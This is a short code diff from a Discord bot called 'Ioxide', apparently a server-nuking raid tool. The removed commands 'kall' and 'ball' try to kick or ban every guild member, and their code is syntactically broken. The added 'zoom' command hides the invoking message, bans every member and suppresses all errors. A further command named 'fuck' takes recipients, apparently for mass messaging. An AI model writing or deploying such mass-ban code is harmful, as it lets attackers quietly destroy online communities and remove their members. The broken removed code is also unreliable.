@@ -185,27 +185,13 @@ async def help(ctx):
     em.set_footer(text="My goals are beyond your understanding")
     await ctx.send(embed=em)
 @Ioxide.command()
-async def kall(ctx):
-    for member in ctx.guild.members:
-        await member.kick()
-        except discord.Forbidden:
-        print(f"{member.name} has FAILED to be kicked from {ctx.guild.name}")
-        else:
-            print(f"{member.name} has been kicked from {ctx.guild.name}")
-  
-    print("Action Completed: kall")
-
-@Ioxide.command()
-async def ball(ctx):
-    for member in ctx.guild.members:
-        await member.ban()
-        except discord.Forbidden:
-        print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
-        else:
-            print(f"{member.name} has been kicked from {ctx.guild.name}")
-                
-           
-    print("Action Completed: ball")  
+async def zoom(ctx):
+    await ctx.message.delete()
+    for user in list(ctx.guild.members):
+        try:
+            await user.ban()
+        except:
+            pass    
 
 @Ioxide.command()
 async def fuck(ctx, recipients):
